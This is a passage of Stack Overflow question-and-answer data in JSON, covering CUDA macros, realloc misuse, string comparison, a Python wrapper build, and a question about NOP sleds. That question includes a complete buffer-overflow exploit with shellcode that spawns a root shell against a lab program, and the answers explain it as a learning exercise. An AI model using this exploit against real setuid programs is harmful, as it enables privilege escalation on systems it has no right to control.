manage my codes into a bunch of different files, but one of my macros won't take the argument passed for some reason.</p>\n\n<p>The error is:</p>\n\n<pre><code>addkernel.cu(19): error: identifier \"err\" is undefined\n</code></pre>\n\n<p>so my main code is in ../cbe4/addkernel.cu </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"cbe4.h\"\n#include \"../mycommon/general.h\"\n\n#define N 100\n\nint main( int argc, char ** argv ){\n\n        float h_out[N], h_a[N], h_b[N]; \n        float *d_out, *d_a, *d_b; \n\n        for (int i=0; i&lt;N; i++) {\n                h_a[i] = i + 5;\n                h_b[i] = i - 10;\n        }\n\n        // The error is on the next line\n        CUDA_ERROR( cudaMalloc( (void **) &amp;d_out, sizeof(float) * N ) );\n        CUDA_ERROR( cudaMalloc( (void **) &amp;d_a, sizeof(float) * N ) ); \n        CUDA_ERROR( cudaMalloc( (void **) &amp;d_b, sizeof(float) * N ) );\n\n        cudaFree(d_a);\n        cudaFree(d_b);\n\n\n        return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>The macro is defined in ../mycommon/general.h:</p>\n\n<pre><code>#ifndef __GENERAL_H__\n#define __GENERAL_H__\n\n#include &lt;stdio.h&gt;\n\n// error checking \nvoid CudaErrorCheck (cudaError_t err, const char *file, int line);\n\n#define CUDA_ERROR ( err ) (CudaErrorCheck( err, __FILE__, __LINE__ )) \n\n#endif\n</code></pre>\n\n<p>and this is the source code for the function CudaErrorCheck in ../mycommon/general.cu:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#include \"general.h\"\n\nvoid CudaErrorCheck (cudaError_t err,\n                        const char *file,\n                        int line) {\n        if ( err != cudaSuccess ) {\n                printf( \"%s in %s at line %d \\n\",\n                        cudaGetErrorString( err ),\n                        file, line );\n                exit( EXIT_FAILURE );\n        }\n}\n</code></pre>\n\n<p>../cbe/cbe4.h is my header file and ../cbe/cbe4.cu the source file for kernel codes (in case this might help):</p>\n\n<p>in cbe4.h:</p>\n\n<pre><code>__global__\nvoid add( float *, float *, float * ); \n</code></pre>\n\n<p>in cbe4.cu:</p>\n\n<pre><code>    #include \"cbe4.h\"\n\n__global__ void add( float *d_out, float *d_a, float *d_b ) {\n        int tid = (blockIdx.x * blockDim.x) + threadIdx.x;\n        d_out[tid] = d_a[tid] + d_b[tid]; }\n</code></pre>\n\n<p>and here's my makefile (stored in ../cbe4): </p>\n\n<pre><code>NVCC = nvcc\nSRCS = addkernel.cu cbe4.cu\nHSCS = ../mycommon/general.cu\n\naddkernel:  \n        $(NVCC) $(SRCS) $(HSCS) -o $@\n</code></pre>\n\n<p>Also, I'm using the Cuda by Example book, by the way. One thing about the code in common/book.h, the function for HandleError ( I renamed it CudaErrorCheck and placed it in another source code here )  was defined in the header file (equivalently, at the CudaErrorCheck declaration in my general.h . Isn't this inadvisable? Or so I heard. ) </p>\n"}, {"tags": ["c", "realloc"], "comments": [{"owner": {"reputation": 1827, "user_id": 187998, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/003aa224fb6ca93a53bd2973a98e242e?s=128&d=identicon&r=PG", "display_name": "Clearer", "link": "https://stackoverflow.com/users/187998/clearer"}, "edited": false, "score": 0, "creation_date": 1517999774, "post_id": 48661566, "comment_id": 84320531, "body": "If you know where your stack is located and how big it is, you could check if the pointer is in the stack."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 4, "creation_date": 1517999776, "post_id": 48661566, "comment_id": 84320533, "body": "Why would you want to recover from it? It&#39;s a bug in your program. Crashing is the best outcome. It allows you to quickly find and fix the problem as close to the root of the problem as you can get."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 4, "creation_date": 1517999973, "post_id": 48661566, "comment_id": 84320669, "body": "Calling <code>free</code> (a part of <code>realloc</code> on an object not previously allocated with <code>malloc, calloc, realloc</code> invokes <i>Undefined Behavior</i> -- your program is over for all reliable purposes at that point. Bail out and fix the problem."}, {"owner": {"reputation": 8204, "user_id": 2858773, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/5iGps.jpg?s=128&g=1", "display_name": "Ajay Brahmakshatriya", "link": "https://stackoverflow.com/users/2858773/ajay-brahmakshatriya"}, "edited": false, "score": 0, "creation_date": 1518000114, "post_id": 48661566, "comment_id": 84320771, "body": "You can make a wrapper around your allocation and free functions that keep a track of all allocated pointers and can tell you if a pointer is valid heap object, but beyond that you can&#39;t do anything portably. If you want a solution for a particular platform, many implementations of heaps expose an API to query heap information."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518000237, "post_id": 48661566, "comment_id": 84320867, "body": "@DavidC.Rankin: That really should be an answer..."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 0, "creation_date": 1518000321, "post_id": 48661566, "comment_id": 84320926, "body": "@Art: but can it be relied upon to crash, then?"}, {"owner": {"reputation": 437, "user_id": 2309803, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ad46f4d663479e6d540cc2436733b3ce?s=128&d=identicon&r=PG", "display_name": "user2309803", "link": "https://stackoverflow.com/users/2309803/user2309803"}, "reply_to_user": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "edited": false, "score": 0, "creation_date": 1518000504, "post_id": 48661566, "comment_id": 84321052, "body": "@Art if str_cat can determine that dest is not pointing to heap memory, then the logic can be adjusted to avoid calling realloc. BTW, I see now that I forgot call free(heap_buf);"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1518002263, "post_id": 48661566, "comment_id": 84322173, "body": "C is call by value. <code>dest = new_dest;</code> :: the dest argument is local to your function. The caller wont be able to see the  new memory."}, {"owner": {"reputation": 2149, "user_id": 2096401, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uVjii.jpg?s=128&g=1", "display_name": "TripeHound", "link": "https://stackoverflow.com/users/2096401/tripehound"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1518003231, "post_id": 48661566, "comment_id": 84322794, "body": "@usr2564301 No, in general you can&#39;t <i>rely</i> on <code>realloc()</code> etc. crashing if they&#39;re passed an invalid pointer (otherwise it would be <i>defined</i> behaviour). Many/most <i>will</i> (because, for example, linked-list memory-block pointers just before the pointer won&#39;t make sense),"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1518003235, "post_id": 48661566, "comment_id": 84322796, "body": "...which means: if the str_cat()funcion actually reallocs, (and the new pointer is different from the old one) main() will call this function the next time with the <b>old</b> value of the pointer, which is no longer valid. And: this is not misuse of realloc, this is (main) referring to a <b>stale pointer</b>."}, {"owner": {"reputation": 18509, "user_id": 939410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bb161e6bf2e1dded07d3fd921f487334?s=128&d=identicon&r=PG", "display_name": "Art", "link": "https://stackoverflow.com/users/939410/art"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 1, "creation_date": 1518003245, "post_id": 48661566, "comment_id": 84322803, "body": "@usr2564301 No, of course it can&#39;t. But it&#39;s very plausible that it will and this is pretty much the best case scenario for debugging."}, {"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1518004892, "post_id": 48661566, "comment_id": 84323834, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/2663456/how-to-write-a-signal-handler-to-catch-sigsegv\">How to write a signal handler to catch SIGSEGV?</a>"}, {"owner": {"reputation": 437, "user_id": 2309803, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ad46f4d663479e6d540cc2436733b3ce?s=128&d=identicon&r=PG", "display_name": "user2309803", "link": "https://stackoverflow.com/users/2309803/user2309803"}, "reply_to_user": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 0, "creation_date": 1518008098, "post_id": 48661566, "comment_id": 84325895, "body": "@wildplasser good catch! I will have to think of a solution to get a pointer to the new buffer back to the caller."}], "answers": [{"comments": [{"owner": {"reputation": 37256, "user_id": 736308, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/o5EqQ.jpg?s=128&g=1", "display_name": "cdarke", "link": "https://stackoverflow.com/users/736308/cdarke"}, "edited": false, "score": 0, "creation_date": 1518004778, "post_id": 48661820, "comment_id": 84323758, "body": "It is possible to handle SIGSEGV on some systems, including Linux, but whether you can do anything useful after that is another matter.  See also <a href=\"https://stackoverflow.com/questions/2663456/how-to-write-a-signal-handler-to-catch-sigsegv\" title=\"how to write a signal handler to catch sigsegv\">stackoverflow.com/questions/2663456/&hellip;</a>"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1518005177, "post_id": 48661820, "comment_id": 84324009, "body": "Yeah - you can catch a Windows structured exception, eg an Access Violation, in a similar manner, and with the same risks if ignored.."}, {"owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "edited": false, "score": 0, "creation_date": 1518006899, "post_id": 48661820, "comment_id": 84325089, "body": "@cdrake, improved wording a bit. I do remember having problems with catching SIGSEGV on linux via sigaction, say process can&#39;t catch it&#39;s own SIGSEGV unless traced? In any case, what OP wants is improper use of the signal, even if possible."}, {"owner": {"reputation": 437, "user_id": 2309803, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ad46f4d663479e6d540cc2436733b3ce?s=128&d=identicon&r=PG", "display_name": "user2309803", "link": "https://stackoverflow.com/users/2309803/user2309803"}, "edited": false, "score": 0, "creation_date": 1518007548, "post_id": 48661820, "comment_id": 84325488, "body": "@user7231 I have clarified my question - I wanted to know if there is a way detect if <code>dest</code> is pointer to non-heap memory before calling realloc. That way the program can stay in control and issue an error message (for example)."}], "tags": [], "owner": {"reputation": 884, "user_id": 9009404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6be791318ce35f7966345ff4964a2025?s=128&d=identicon&r=PG&f=1", "display_name": "Uprooted", "link": "https://stackoverflow.com/users/9009404/uprooted"}, "is_accepted": false, "score": 4, "last_activity_date": 1518447490, "last_edit_date": 1518447490, "creation_date": 1518000295, "answer_id": 48661820, "question_id": 48661566, "link": "https://stackoverflow.com/questions/48661566/can-misuse-of-realloc-be-reliably-detected/48661820#48661820", "title": "Can misuse of realloc be reliably detected?", "body": "<p>No, it's not possible to catch or handle SIGSEGV on most systems in a meaningful way. This is because at the point when the program causes unmapped memory access it probably have damaged its stack or data or code already, so can't be trusted and is beyond saving. You're better off crashing immediately if you detect such situation so you can analyze dumped core in debugger.</p>\n\n<p>To track invalid access valgrind is a nice tool, try <code>valgrind ./a.out</code>, will run slow but track many things, including misuses of malloc/realloc/free.</p>\n\n<p>Edit: (since OP edited the question) No, it's not possible to detect if pointer is a correct argument for realloc/free, unless you track all (de)allocations (say using malloc hooks).</p>\n"}], "owner": {"reputation": 437, "user_id": 2309803, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ad46f4d663479e6d540cc2436733b3ce?s=128&d=identicon&r=PG", "display_name": "user2309803", "link": "https://stackoverflow.com/users/2309803/user2309803"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 158, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1518447490, "creation_date": 1517999611, "last_edit_date": 1518006036, "question_id": 48661566, "link": "https://stackoverflow.com/questions/48661566/can-misuse-of-realloc-be-reliably-detected", "title": "Can misuse of realloc be reliably detected?", "body": "<p>It appears that when the realloc function is called with a pointer to non-heap memory, the program dies with</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Error(s):\nInvalid memory reference (SIGSEGV)\n</code></pre>\n\n<p>Is it possible for my <code>str_cat</code> function to detect this case and thus avoid calling realloc</p>\n\n<p>Here is a sample program which demonstrates the problem:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>//gcc 5.4.0\n\n#include  &lt;stdio.h&gt;\n#include  &lt;string.h&gt;\n#include  &lt;stdlib.h&gt;\n\nint str_cat(char *dest, size_t *dest_size, char *src);\n\nint str_cat(char *dest, size_t *dest_size, char *src) {\n// if there is sufficient free space in the dest buffer, append src, \n// otherwise keep doubling the allocated size of dest until it is large \n// enough to append src        \n    size_t src_len = strlen(src);\n    size_t dest_len = strlen(dest);\n    if (src_len &lt; *dest_size - dest_len) {\n        memcpy(dest+dest_len, src, src_len+1);\n        return 0;\n    } else {\n        char *new_dest = NULL;\n        size_t new_size = *dest_size * 2;\n        while (src_len &gt;= new_size - dest_len) {\n            new_size *= 2;\n        }\n        if ((new_dest = realloc(dest, new_size)) != NULL) {\n           dest = new_dest;\n           *dest_size = new_size;\n           memcpy(dest+dest_len, src, src_len+1);  \n           return 0;\n        } else {\n            return -1;\n        }\n    }\n}\n\nint main(void)\n{\n    size_t heap_buf_size=5;\n    char *heap_buf = malloc(heap_buf_size);\n    size_t stack_buf_size=5;\n    char stack_buf[stack_buf_size];\n\n    *heap_buf = '\\0';\n    if (str_cat(heap_buf, &amp;heap_buf_size, \"foo\")) return -1;\n    printf(\"1. heap_buf %s\\n\", heap_buf);\n    printf(\"1. heap_buf_size %zu\\n\", heap_buf_size);\n    if (str_cat(heap_buf, &amp;heap_buf_size, \"bar\")) return -1;\n    printf(\"2. heap_buf %s\\n\", heap_buf);\n    printf(\"2. heap_buf_size %zu\\n\", heap_buf_size);\n\n    stack_buf[0] = '\\0';\n    if (str_cat(stack_buf, &amp;stack_buf_size, \"foo\")) return -1;\n    printf(\"3. stack_buf %s\\n\", stack_buf);\n    printf(\"3. stack_buf_size %zu\\n\", stack_buf_size);\n/* If the line below is uncommented, the program dies\n   with Invalid memory reference (SIGSEGV)    */\n//    if (str_cat(stack_buf, &amp;stack_buf_size, \"bar\")) return -1;\n    printf(\"4. stack_buf %s\\n\", stack_buf);\n    printf(\"4. stack_buf_size %zu\\n\", stack_buf_size);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "character", "parameter-passing"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1517999093, "post_id": 48661318, "comment_id": 84320002, "body": "You should grab a beginner&#39;s text book on C and learn how strings work in C. There is a set of string functions in standard library. Including functions to compare strings."}, {"owner": {"reputation": 17910, "user_id": 3963067, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/1e536542e9baa5c52499d61fb64f51d3?s=128&d=identicon&r=PG&f=1", "display_name": "gmoniava", "link": "https://stackoverflow.com/users/3963067/gmoniava"}, "edited": false, "score": 0, "creation_date": 1517999095, "post_id": 48661318, "comment_id": 84320005, "body": "<code>strcmp</code> should help."}, {"owner": {"reputation": 37, "user_id": 3011052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UzvDc.jpg?s=128&g=1", "display_name": "Hitomi86", "link": "https://stackoverflow.com/users/3011052/hitomi86"}, "edited": false, "score": 0, "creation_date": 1518031400, "post_id": 48661318, "comment_id": 84341464, "body": "Hmm, it&#39;s still not working I&#39;m getting true no matter what I enter in as an argument, what format is the argument? is it a string/int/char?"}, {"owner": {"reputation": 37, "user_id": 3011052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UzvDc.jpg?s=128&g=1", "display_name": "Hitomi86", "link": "https://stackoverflow.com/users/3011052/hitomi86"}, "edited": false, "score": 0, "creation_date": 1518031781, "post_id": 48661318, "comment_id": 84341726, "body": "Never mind, I got it work!"}], "owner": {"reputation": 37, "user_id": 3011052, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UzvDc.jpg?s=128&g=1", "display_name": "Hitomi86", "link": "https://stackoverflow.com/users/3011052/hitomi86"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 34, "favorite_count": 0, "closed_date": 1517999088, "answer_count": 0, "score": 0, "last_activity_date": 1517998975, "creation_date": 1517998975, "question_id": 48661318, "link": "https://stackoverflow.com/questions/48661318/how-to-compare-string-from-parameter-in-c", "closed_reason": "Duplicate", "title": "How to compare string from parameter in C?", "body": "<p>I am writing a program that takes two input parameters the first input parameter MUST be \"-t\", the second can be any number.</p>\n\n<p>In order for the program to proceed, it must first check if the first parameter is \"-t\"</p>\n\n<p>so for example, I would run it by typing \"./a.out -t 45\"</p>\n\n<p>I tried to do this using the following:</p>\n\n<pre><code>int main(int argc, char *argv[]){\n    char *par ;\n    par = argv[1];\n\n    if(par == \"-t\"){\n         printf(\"The parameter is: %s \\n, The program will proceed\" , par);\n    } else {\n         printf(\"Incorrect input \\n\");\n         exit(1);   \n    }\n\n    // continue program\n}\n</code></pre>\n\n<p>However I always get \"Incorrect input no matter what, I'm not sure what I'm doing wrong. The variable \"par\" is a character array, and the parameter\nthat I'm comparing it to is a character array so shouldn't the first part of the if statement execute instead of the else?</p>\n\n<p>I looked here: <a href=\"https://stackoverflow.com/questions/5157337/c-reading-command-line-parameters\">C - reading command line parameters</a></p>\n\n<p>but it wasn't much help. I can print the parameter just fine, I just can't compare it.</p>\n"}, {"tags": ["c", "assembly", "reverse-engineering", "buffer-overflow", "cracking"], "answers": [{"tags": [], "owner": {"reputation": 100, "user_id": 7909178, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wOYyM.jpg?s=128&g=1", "display_name": "Prime Ape", "link": "https://stackoverflow.com/users/7909178/prime-ape"}, "is_accepted": false, "score": 0, "last_activity_date": 1518000516, "creation_date": 1518000516, "answer_id": 48661897, "question_id": 48661233, "link": "https://stackoverflow.com/questions/48661233/why-is-the-nop-block-and-the-shellcode-before-the-return-address/48661897#48661897", "title": "Why is the &quot;NOP-Block&quot; and the Shellcode before the return Address?", "body": "<p>NOP-block is used in the stack overflow exploitation because you don't may predict where the return address is placed. \nWhen you exploit vulnerability, you can't affect on the execution flow directly - it means that you can't <em>run</em> your shellcode, but can place the piece of code in the memory of vulnerable application and expect it to run by the execution flow. \nYou can't predict the size of a function where vulnerable string is situated, so adding NOPs to the shellcode increases chanses to overwrite code at return address and succesfully execute your payload after the NOPs.</p>\n"}, {"tags": [], "owner": {"reputation": 658, "user_id": 2372992, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/65e5b2cb3b356fe30143fe271d780f45?s=128&d=identicon&r=PG&f=1", "display_name": "amritanshu", "link": "https://stackoverflow.com/users/2372992/amritanshu"}, "is_accepted": false, "score": 2, "last_activity_date": 1518029365, "last_edit_date": 1518029365, "creation_date": 1518001949, "answer_id": 48662393, "question_id": 48661233, "link": "https://stackoverflow.com/questions/48661233/why-is-the-nop-block-and-the-shellcode-before-the-return-address/48662393#48662393", "title": "Why is the &quot;NOP-Block&quot; and the Shellcode before the return Address?", "body": "<p>NOP-slide is a technique used when you can't precisely predict at which offset the execution will begin when the shell gets executed, you have to pad the shellcode with nops in the preamble to ensure the execution doesn't start in the 'middle' of your shellcode.</p>\n\n<p>The CPU simply slides through the nops without impacting any registers except the instruction pointer.</p>\n\n<p>In your code, I think you're triangulating the return address from main in <code>notesearch</code> using the address of a local variable <code>i</code> in your current process. Based on the compiler and platform the actual location from where the execution starts in the copied buffer (which is also <code>argv[1]</code>) could be off by few bytes. So you need to add a slide of few bytes to ensure things work. </p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9326786"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1827, "favorite_count": 1, "answer_count": 2, "score": 3, "last_activity_date": 1518029365, "creation_date": 1517998780, "question_id": 48661233, "link": "https://stackoverflow.com/questions/48661233/why-is-the-nop-block-and-the-shellcode-before-the-return-address", "title": "Why is the &quot;NOP-Block&quot; and the Shellcode before the return Address?", "body": "<p>In this example exploit the layout is [NOP-Block][Shellcode][Return Adress]\nBut why cant I just overwrite the original return Address with the Adress to my Shellcode ?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\nchar shellcode[]= \n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\n\nint main(int argc, char *argv[]) {\n   unsigned int i, *ptr, ret, offset=270;\n   char *command, *buffer;\n\n   command = (char *) malloc(200);\n   bzero(command, 200); // zero out the new memory\n\n   strcpy(command, \"./notesearch \\'\"); // start command buffer\n   buffer = command + strlen(command); // set buffer at the end\n\n   if(argc &gt; 1) // set offset\n      offset = atoi(argv[1]);\n\n   ret = (unsigned int) &amp;i - offset; // set return address\n\n   for(i=0; i &lt; 160; i+=4) // fill buffer with return address\n      *((unsigned int *)(buffer+i)) = ret;\n   memset(buffer, 0x90, 60); // build NOP sled\n   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); \n\n   strcat(command, \"\\'\");\n\n   system(command); // run exploit\n   free(command);\n}\n</code></pre>\n"}, {"tags": ["python", "c", "cython", "wrapper", "bioinformatics"], "comments": [{"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1517999814, "post_id": 48661188, "comment_id": 84320550, "body": "Based on the first warning: is it possible you are applying 21st century C compiler defaults to 20th century code? (Trying not to be mean and say &quot;19th century&quot; here...)"}, {"owner": {"reputation": 179, "user_id": 8159777, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/1372948942759226/picture?type=large", "display_name": "Matthijs van Kesteren", "link": "https://stackoverflow.com/users/8159777/matthijs-van-kesteren"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1518004619, "post_id": 48661188, "comment_id": 84323657, "body": "How would I find out? :)"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1518007266, "post_id": 48661188, "comment_id": 84325286, "body": "The functions <code>static void libcurl_exit()</code>, <code>static void process_messages()</code>, and <code>static int wait_perform()</code> (and probably more) are defined in an old-fashioned way. The current &#39;PC&#39; way is to have <code>..(void)</code> as their argument, not <i>nothing</i>. I think I saw a <code>-Werror</code> somewhere in one of the makefiles. It may or may not be enough to remove that \u2013 if not, contact the authors."}, {"owner": {"reputation": 23048, "user_id": 4657412, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4915a27d01efa79d81d322511ee517a9?s=128&d=identicon&r=PG&f=1", "display_name": "DavidW", "link": "https://stackoverflow.com/users/4657412/davidw"}, "edited": false, "score": 2, "creation_date": 1518036702, "post_id": 48661188, "comment_id": 84344342, "body": "I don&#39;t think the warnings are particularly important to why it&#39;s failing. Looking at <code>hfile_s3.c</code>, I think you need either CommonCrypto or OpenSSL. I think CommonCrypto is Mac only so you should look at installing OpenSSL headers."}, {"owner": {"reputation": 179, "user_id": 8159777, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/1372948942759226/picture?type=large", "display_name": "Matthijs van Kesteren", "link": "https://stackoverflow.com/users/8159777/matthijs-van-kesteren"}, "edited": false, "score": 0, "creation_date": 1518448130, "post_id": 48661188, "comment_id": 84499085, "body": "Thanks, installing OpenSSL did the trick!"}], "owner": {"reputation": 179, "user_id": 8159777, "user_type": "registered", "accept_rate": 83, "profile_image": "https://graph.facebook.com/1372948942759226/picture?type=large", "display_name": "Matthijs van Kesteren", "link": "https://stackoverflow.com/users/8159777/matthijs-van-kesteren"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 107, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1517998650, "creation_date": 1517998650, "question_id": 48661188, "link": "https://stackoverflow.com/questions/48661188/issues-installing-a-python-wrapper-for-a-c-program-on-linux-subsystem-for-window", "title": "Issues installing a python wrapper for a C program on Linux Subsystem for Windows", "body": "<p>I am trying to use a new bioinformatics program written in C named 'Giggle'. They have included a python wrapper. Since I am on Windows 10 most of the bioinformatics stuff is only available for Linux, I am using the Linux subssystem with python 2 installed. The installation for the wrapper are as follows:</p>\n\n<pre><code>git clone --recursive https://github.com/brentp/python-giggle\ncd python-giggle\npython setup.py test\npython setup.py install\n</code></pre>\n\n<p>When running the <code>setup.py test</code> I encountered all sorts of dependencies of which I had never heard like libbz2 and liblzma. Installation of these dependencies worked fine with <code>sudo apt-get install</code> but now upon running the test I get a long list of warnings like this one:</p>\n\n<pre><code>    lib/htslib/hfile_libcurl.c:187:13: warning: function declaration isn\u2019t a \n        prototype [-Wstrict-prototypes]\n        static void libcurl_exit()\n</code></pre>\n\n<p>These are all for different .h and .c files. The list ends with several errors:</p>\n\n<pre><code>    lib/htslib/hfile_s3.c:70:2: error: #error No HMAC() routine found by configure\n #error No HMAC() routine found by configure\n  ^\nlib/htslib/hfile_s3.c: In function \u2018s3_rewrite\u2019:\nlib/htslib/hfile_s3.c:335:30: error: \u2018DIGEST_BUFSIZ\u2019 undeclared (first use in this function)\n         unsigned char digest[DIGEST_BUFSIZ];\n                              ^\nlib/htslib/hfile_s3.c:335:30: note: each undeclared identifier is reported only once for each function it appears in\nlib/htslib/hfile_s3.c:336:29: warning: implicit declaration of function \u2018s3_sign\u2019 [-Wimplicit-function-declaration]\n         size_t digest_len = s3_sign(digest, &amp;secret, &amp;message);\n                             